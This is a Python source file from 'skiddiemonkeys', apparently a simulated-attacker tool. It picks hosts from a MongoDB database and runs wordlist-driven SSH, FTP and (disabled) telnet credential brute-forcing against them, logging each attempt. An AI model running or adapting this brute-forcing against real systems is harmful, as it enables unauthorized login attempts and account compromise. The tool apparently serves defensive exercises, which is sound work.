#!/usr/bin/python
# skiddiemonkeys Copyright 2014 Russell Butturini and Joshua Tower
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.


import paramiko
import ftplib
import telnetlib
import socket
import time
from pymongo import MongoClient
from random import randint
from helperFunctions import openMDB

def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
    timeout = time.time() + 60 * runTime

    while True:
        hostList = {}
        ports = []
        time.sleep(1)

        if time.time() > timeout:
            break

        db = openMDB(dbIp,dbName)
        if db is None:
            print 'Could not connect to db'
        hosts = db.hosts


        if hosts.find({'location':monkeyLoc}).count() == 0:
            print 'Brute monkey is waiting for work.  Eating bananas.  Will check again in 10 seconds.'
            time.sleep(10)

        else:
            for work in hosts.find({'location':monkeyLoc}):

                if 21 in work['ports'] or 22 in work['ports'] or 23 in work['ports']:
                    decisionCalc = ( int(monkeyIq) * int(db.targets.find_one({'ip' : work['ip']})['value']))/(db.actions.find({'ip' : work['ip'] }).count() + 1 ) + randint(1,10)
                    hostList.update( {work['ip'] : decisionCalc } )

            if len(hostList) > 0:
                    target = max(hostList,key=hostList.get)
                    openPorts = db.hosts.find_one({'ip' : target})['ports']

                    if 21 in openPorts:
                        ports.append(21)

                    if 22 in openPorts:
                        ports.append(22)

                    #if 23 in openPorts:
                    #    ports.append(23)


        if len(ports) == 0:
            print 'Brute monkey is waiting for something to brute force.  Eating bananas.  Will check again in 10 seconds.'
            time.sleep(10)

        else:
            print 'Brute monkey got work! Starting credential brute forcing!'
            index = randint(0,len(ports)-1)

            if ports[index] == 21:
                ftpBrute(target,db,hosts,monkeyId)

            elif ports[index] == 22:
                sshBrute(target,db,hosts,monkeyId)

            #elif ports[index] == 23:
             #   telBrute(target,db,hosts,monkeyId)

def sshBrute(victim,db,coll,monkeyId):
    startTime = time.ctime()

    try:
        with open('./lists/wordlist_ssh.txt') as f:
            credList = f.readlines()

    except:
        print 'Error opening SSH cred list.'
        return

    for creds in credList:
        user, pwd = creds.rstrip().split(':')
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(victim, 22, user, pwd)

        except paramiko.AuthenticationException, e:
            pass

        except socket.error, e:
            pass

    endTime = time.ctime()
    print 'Finished SSH brute forcing of ' + victim + 'at ' + endTime
    saveResults('sshbruteforce',db,coll,victim,22,startTime,endTime,monkeyId)

def ftpBrute(victim,db,coll,monkeyId):
    startTime = time.ctime()

    try:
        with open('./lists/wordlist_ftp.txt') as f:
            credList = f.readlines()

    except:
        print 'Error opening FTP cred list.'
        return


    for creds in credList:
        user, pwd = creds.rstrip().split(':')

        try:
            ftp = ftplib.FTP(victim)
            ftp.login(user, pwd)

        except:
            pass

    endTime = time.ctime()
    print 'finished FTP brute forcing of ' + victim + ' at ' + endTime
    saveResults('ftpbruteforce',db,coll,victim,21,startTime,endTime,monkeyId)
    return

def telBrute (victim,db,coll,monkeyId):
    startTime = time.ctime()

    try:
        with open('./lists/wordlist_telnet.txt') as f:
            credList = f.readlines()

    except:
        print 'Error opening telnet cred list.'
        return

    for creds in credList:
        user, pwd = creds.rstrip().split(':')

        try:
            telnet = telnetlib.Telnet(victim,23,5)
            telnet.read_until('username:',timeout=5)
            telnet.write(user + '\n')
            telnet.read_until('password:',timeout=5)
            telnet.write(pwd + '\n')

        except:
            pass

    endTime = time.ctime()
    print 'finished telnet brute forcing of ' + victim + 'at ' + endTime
    saveResults('telnetbruteforce',db,coll,victim,23,startTime,endTime,monkeyId)
    return

def saveResults(whichBrute,dbConn,coll,target,port,startTime,endTime,monkeyId):
    action = dbConn.actions
    action.insert({'action': whichBrute,'ip':target,'port':port,'start':startTime,'end':endTime,'id':monkeyId})
